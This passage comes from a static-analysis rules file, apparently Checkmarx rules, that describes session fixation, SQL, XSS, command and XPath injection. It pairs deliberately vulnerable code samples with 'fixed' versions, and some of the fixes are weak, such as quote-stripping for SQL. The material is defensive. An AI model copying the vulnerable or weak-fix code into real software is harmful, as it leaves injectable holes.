&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2099</key><name>Session_Fixation</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;

An attacker could get a user to log in using the attacker’s session. The attacker could then do anything that the other user has permissions for, such as accessing that user’s confidential information and performing transaction in that user’s name.

                        
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;

The application authenticates users without terminating existing sessions. As a result, an attacker could get a victim to log in to the application during the attacker’s session (for example, by getting the victim to click on a link including a session ID),
and the application would authenticate the attacker’s session as the victim’s user account.

                        
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;

The application should terminate any existing sessions upon user authentication and create a new session for that user.

                        
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application does not terminate the current session before a user accesses it
      &lt;/h4&gt;&lt;pre&gt;

public class Sessionfixation 
{
        static void foo(string firstName)
        {
                HttpContext context = HttpContext.Current;
                context.Session["FirstName"] = firstName;
        }
}        



      &lt;/pre&gt;&lt;h4&gt;
Prior to a new interaction with the session the old session is abandoned
      &lt;/h4&gt;&lt;pre&gt;

public class SessionfixationFixed 
{
        static void foo(string firstName, HttpContext old_Context)
        {
                old_Context.Session.Abandon();
                HttpContext context = HttpContext.Current;
                context.Session["FirstName"] = firstName;
        }
}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_593</key><name>Second_Order_SQL_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could directly access all of the system's data. The attacker would be able to steal any sensitive information stored by the system (such as personal user details or credit cards), and possibly change or erase existing data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with its database by sending a textual SQL query. The application creates the query by simply concatenating strings including data obtained from the database. Since that data may have been previously obtained from user input, and is neither checked for data type validity nor subsequently sanitized, the data could contain SQL commands that would be interpreted as such by the database.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all data, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Instead of concatenating strings: a. Use secure database components such as stored procedures, parameterized queries, and object bindings (for commands and parameters). b. An even better solution is to use an ORM library, such as EntityFramework, Hibernate, or iBatis.&lt;/li&gt;
&lt;li&gt;Restrict access to database objects and functionality, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application creates an SQL query using data obtained from a database
      &lt;/h4&gt;&lt;pre&gt;public class SecondOrderSQLInjection
{
        public void foo(SqlConnection connection, SqlDataAdapter DA)
        {
                DataSet DS = new DataSet();
                DA.Fill(ref DS, "UserName"); 
                SqlCommand command = new SqlCommand("SELECT * FROM Customers " + "WHERE UserName = " + DS[0]["UserName"].ToString(), connection);
                command.ExecuteNonQuery();
        }
}&lt;/pre&gt;&lt;h4&gt;
The data obtained from the database is checked for potentially malicious characters
      &lt;/h4&gt;&lt;pre&gt;class SecondOrderSQLInjectionFixed
{
        public void foo(SqlConnection connection, SqlDataAdapter DA)
        {
                DataSet DS = new DataSet();
                DA.Fill(ref DS, "UserName");
                string userName = DS[0]["UserName"].ToString().Replace("'", "");
                SqlCommand command = new SqlCommand("SELECT * FROM Customers " + "WHERE UserName = " + userName, connection);
                command.ExecuteNonQuery();
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application creates an SQL query using data obtained from a database&lt;/h4&gt;&lt;pre&gt;public class Second_Order_SQL_Injection {
	public static void sql(Connection con, String sqlStm) {
		try {
			Statement stmt = con.createStatement();
			ResultSet rs = stmt.executeQuery(sqlStm);
			String userName = rs.getString("USER_NAME");
			String newSqlStm = "Update USER set PASSWORD = '1234' where userName like " + userName;
			stmt.executeUpdate(newSqlStm);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;h4&gt;The data obtained from the database is checked for potentially malicious characters&lt;/h4&gt;&lt;pre&gt;public class Second_Order_SQL_Injection_Fixed {
	public static void sql(Connection con, String sqlStm) {
		try {
			Statement stmt = con.createStatement();
			ResultSet rs = stmt.executeQuery(sqlStm);
			String userName = rs.getString("USER_NAME");
			userName = userName.replaceAll("'", "");
			String newSqlStm = "Update USER set PASSWORD = '1234' where userName like " + userName;
			stmt.executeUpdate(newSqlStm);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_621</key><name>UTF7_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, rewriting web pages and inserting malicious scripts. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from previous user input. The user input is embedded directly in the page's HTML, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or the built-in platform functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Bad - The application uses the "Referer" field string to construct the HttpResponse&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClients
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(Referer);
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "Referer" field string is HTML encoded before use&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClientsFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response, AntiXss.AntiXssEncoder encoder)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(encoder.HtmlEncode(Referer, true));
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - User input is written to a TextBox displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClients
{
        public void foo(TextBox tb)
        {
                string input = Console.ReadLine();
                tb.Text = input;
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The user input is HTML encoded before being displayed on the screen&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClientsFixed
{
        public void foo(TextBox tb, AntiXssEncoder encode)
        {
                string input = Console.ReadLine();
                tb.Text = encode.HtmlEncode(input);
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - The application uses the "filename" field string from an HttpRequest construct an HttpResponse&lt;/h4&gt;&lt;pre&gt;public class UTF7XSS
{
        public void foo(HttpRequest Request, HttpResponse Response
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["filename"];
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "filename" string is converted to an int and using a switch case the new "filename" string is constructed&lt;/h4&gt;&lt;pre&gt;public class UTF7XSSFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["fileNum"];
                int fileNum = Convert.ToInt32(filename);
                
                switch(fileNum)
                {
                        case 1:
                                filename = "File1.txt";
                                break;
                        default:
                                filename = "File2.txt";
                                break;
                }
                
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User input is written to a label displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClients {
	public static void XSSExample(TextArea name) {	
		Label label = new Label();		
		label.setText("Hello " + name.getText());	
	}
}&lt;/pre&gt;&lt;h4&gt;Switch case is used in order to assemble the label's text value and manage wrong user input&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClientsFixed {
	public static void XSSExample(TextArea name) {
		Label label = new Label();		
		switch (name) {
		case "Joan":
			label.setText("Hello Joan");	
			break;
		case "Jim":
			label.setText("Hello Jim");	
			break;
		case "James":
			label.setText("Hello James");	
			break;
		default:
			System.out.println("Wrong Input");
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_588</key><name>Command_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could run arbitrary system-level OS commands on the application server host. Depending on the application&amp;rsquo;s OS permissions, these could include:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;File actions (read / create / modify / delete)&lt;/li&gt;
&lt;li&gt;Open a network connection to the attacker&amp;rsquo;s server&lt;/li&gt;
&lt;li&gt;Start and stop system services&lt;/li&gt;
&lt;li&gt;Complete server takeover&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application runs an OS system-level command to complete it's task, rather than via application code. The command includes untrusted data, that may be controllable by an attacker. This untrusted string may contain malicious, system-level commands engineered by an attacker, which would be executed as though the attacker were running commands directly on the application server.&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Refactor the code to avoid any direct shell command execution. Instead, use platform provided APIs or library calls.&lt;/li&gt;
&lt;li&gt;If it is impossible to remove the command execution, execute only static commands that do not include dynamic, user-controlled data.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified format, rather than rejecting bad patterns (blacklist). Parameters should be limited to an allowed character set, and non-validated input should be dropped. In addition to characters, check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;In order to minimize damage as a measure of defense in depth, configure the application to run using a restricted user account that has no unnecessary OS privileges.&lt;/li&gt;
&lt;li&gt;If possible, isolate all OS commands to use a separate, dedicated user account that has minimal privileges only for the specific commands and files used by the application, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1687</key><name>Stored_XPath_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Depending on the type of information contained in the queried XML document, an attacker could cause any effect of selecting the wrong information from the XML document, such as stealing unauthorized data or impersonating another user.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application queries an XML document by using a textual XPath query. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could be maliciously crafted to cause the application to select the wrong information from the XML document.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Ideally, avoid making the xpath query dependent on user input. If it is necessary to make the query dependent on user input, preferably map XPath queries to user parameters, maintaining separation between data and code. If it is necessary to include the user input in the query, the input must be first properly validated as above.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application uses a user inputed string to construct an XPath query
      &lt;/h4&gt;&lt;pre&gt;class XPathInjection
    {
        static void foo(XPathDocument document)
        {
            XPathNavigator navigator = document.CreateNavigator();
            string input = Console.ReadLine();
            XPathNodeIterator nodes = navigator.Select(input);
        }
    }&lt;/pre&gt;&lt;h4&gt;
The user inputed string is encoded before usage in the XPath query
      &lt;/h4&gt;&lt;pre&gt;class XPathInjectionFixed
    {
        static void foo(XPathDocument document)
        {
            XPathNavigator navigator = document.CreateNavigator();
            string input = Console.ReadLine();
                        byte[] fileName = md5.ComputeHash(System.Text.Encoding.ASCII.GetBytes(input));
                        input = System.Text.Encoding.Default.GetString(fileName);
            XPathNodeIterator nodes = navigator.Select(input);
        }
    }&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application uses a user inputed string to construct an XPath query&lt;/h4&gt;&lt;pre&gt;public class XPath_Injection {
	public static void main(String[] args) {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter xpath expression: ");
		String expression = userInputScanner.nextLine();

		// read a string value
		XPath xPath = XPathFactory.newInstance().newXPath();
		try {
			XPathExpression email = xPath.compile(expression);
		} catch (XPathExpressionException e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;h4&gt;The user inputed string is encoded before usage in the XPath query&lt;/h4&gt;&lt;pre&gt;public class XPath_Injection_Fixed {
	public static void main(String[] args) {
		HashMap&lt;String, String&gt; sanitize = new HashMap&lt;String, String&gt;();
		sanitize.put("student", "/class/student");
		sanitize.put("graduate", "/class/graduate");
		sanitize.put("professor", "/class/professor");
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter xpath expression: ");
		String expression = userInputScanner.nextLine();

		// read a string value
		XPath xPath = XPathFactory.newInstance().newXPath();
		try {
			XPathExpression email = xPath.compile(sanitize.get(expression));
		} catch (XPathExpressionException e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;h3&gt;Python&lt;/h3&gt;&lt;h4&gt;The application uses a user inputed string to construct an XPath query&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import xpath
print 'Insert item number: '
userInput = stdin.readline()	
xpath.find('//item' + userInput, doc)&lt;/pre&gt;&lt;h4&gt;The user inputed string is turned into an integer before usage in the XPath query&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import xpath
print 'Insert item number: '
userInput = stdin.readline()	
xpath.find('//item' + str(int(userInput)), doc)&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2133</key><name>Improper_Build_Of_Sql_Mapping</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Improper Sanitization of Special Elements used in an SQL Command ('SQL Injection')&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;89&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_89_Description" id="oc_89_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software constructs all or part of an SQL command using
externally-influenced input from an upstream component, but it does not sanitize
or incorrectly sanitizes special elements that could modify the intended SQL
command when it is sent to a downstream component.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Without sufficient removal or quoting of SQL syntax in user-controllable
inputs, the generated SQL query can cause those inputs to be interpreted as
SQL instead of ordinary user data. This can be used to alter query logic to
bypass security checks, or to insert additional statements that modify the
back-end database, possibly including execution of system commands.&lt;/p&gt;
&lt;p&gt;SQL injection has become a common issue with database-driven web sites.
The flaw is easily detected, and easily exploited, and as such, any site or
software package with even a minimal user base is likely to be subject to an
attempted attack of this kind. This flaw depends on the fact that SQL makes
no real distinction between the control and data planes.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_89_Time of Introduction" id="oc_89_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;li&gt;Operation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_89_Applicable Platforms" id="oc_89_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;p class="subheading"&gt;Technology Classes&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Database-Server&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Modes of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Modes of Introduction&lt;/div&gt;&lt;div name="oc_89_Modes of Introduction" id="oc_89_Modes of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This weakness typically appears in data-rich applications that save user
inputs in a database.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_89_Common Consequences" id="oc_89_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Since SQL databases generally hold sensitive data, loss of
confidentiality is a frequent problem with SQL injection
vulnerabilities.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Authentication&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If poor SQL commands are used to check user names and passwords, it
may be possible to connect to a system as another user with no previous
knowledge of the password.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Authorization&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If authorization information is held in a SQL database, it may be
possible to change this information through the successful exploitation
of a SQL injection vulnerability.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Just as it may be possible to read sensitive information, it is also
possible to make changes or even delete this information with a SQL
injection attack.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_89_Likelihood of Exploit" id="oc_89_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Very High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Enabling Factors for Exploitation"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Enabling Factors for Exploitation&lt;/div&gt;&lt;div name="oc_89_Enabling Factors for Exploitation" id="oc_89_Enabling Factors for Exploitation" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;The application dynamically generates queries that contain user
input.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Detection Methods"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Detection Methods&lt;/div&gt;&lt;div name="oc_89_Detection Methods" id="oc_89_Detection Methods" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Automated Static Analysis&lt;/p&gt;&lt;p&gt;This weakness can often be detected using automated static analysis
tools. Many modern tools use data flow analysis or constraint-based
techniques to minimize the number of false positives.&lt;/p&gt;&lt;p&gt;Automated static analysis might not be able to recognize when proper
input validation is being performed, leading to false positives - i.e.,
warnings that do not have any security consequences or do not require
any code changes.&lt;/p&gt;&lt;p&gt;Automated static analysis might not be able to detect the usage of
custom API functions or third-party libraries that indirectly invoke SQL
commands, leading to false negatives - especially if the API/library
code is not available for analysis.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Manual Analysis&lt;/p&gt;&lt;p&gt;Manual analysis can be useful for finding this weakness, but it might
not achieve desired code coverage within limited time constraints. This
becomes difficult for weaknesses that must be considered for all inputs,
since the attack surface can be too large.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_89_Demonstrative Examples" id="oc_89_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;In 2008, a large number of web servers were compromised using the
same SQL injection attack string. This single string worked against many
different programs. The SQL injection was then used to modify the web sites
to serve malicious code. [1]&lt;/p&gt;&lt;p class="subheading"&gt;Example 2&lt;/p&gt;&lt;p&gt;The following code dynamically constructs and executes a SQL query
that searches for items matching a specified name. The query restricts the
items displayed to those where owner matches the user name of the
currently-authenticated user.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C#&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;string userName = ctx.getAuthenticatedUserName();&lt;/div&gt;&lt;div style="font-size:90%;"&gt;string query = "SELECT * FROM items WHERE owner = '" + userName +
